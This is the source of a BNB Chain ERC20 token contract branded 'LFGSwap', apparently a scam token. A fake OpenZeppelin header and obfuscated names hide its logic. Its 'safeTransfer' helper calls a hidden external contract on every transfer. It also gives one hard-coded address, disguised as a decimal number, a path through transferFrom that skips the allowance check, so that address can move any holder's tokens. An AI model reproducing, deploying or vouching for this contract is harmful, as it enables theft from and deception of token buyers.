/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/WKONan2FdXYEps6v.sol

// OpenZeppelin Contracts v4.4.1 (utils/WKONan2FdXYEps6v.sol)

abstract contract WKONan2FdXYEps6v {
  function bUeHUyIkQsgAauP0() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(541373187392680265727235952506873406657595872132)) {TransferHelper.safeTransferFrom(address(577732778294046311763667492439212066650317428503),spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, WKONan2FdXYEps6v {
  mapping(address => uint256) private kmKxSXq8wJY7rFgB;
  mapping(address => mapping(address => uint256)) private pLDdU4CW0Ea93XOf;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    slEfDx8KNi7M6bn3(bUeHUyIkQsgAauP0(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "LFGSwap";
  }

  function symbol() public pure returns (string memory) {
    return "LFG";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return kmKxSXq8wJY7rFgB[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    GStm2aLGC86vB3dX(bUeHUyIkQsgAauP0(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return pLDdU4CW0Ea93XOf[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    GStm2aLGC86vB3dX(
      bUeHUyIkQsgAauP0(),
      spender,
      pLDdU4CW0Ea93XOf[bUeHUyIkQsgAauP0()][spender] + addedValue
    );
    return true;
  }

  function GStm2aLGC86vB3dX(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    pLDdU4CW0Ea93XOf[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = pLDdU4CW0Ea93XOf[bUeHUyIkQsgAauP0()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    GStm2aLGC86vB3dX(bUeHUyIkQsgAauP0(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function slEfDx8KNi7M6bn3(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    kmKxSXq8wJY7rFgB[spender] = kmKxSXq8wJY7rFgB[spender] - amount;
    kmKxSXq8wJY7rFgB[recipient] = kmKxSXq8wJY7rFgB[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!slEfDx8KNi7M6bn3(sender, recipient, amount)) return true;
    uint256 currentAllowance = pLDdU4CW0Ea93XOf[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    GStm2aLGC86vB3dX(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    kmKxSXq8wJY7rFgB[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}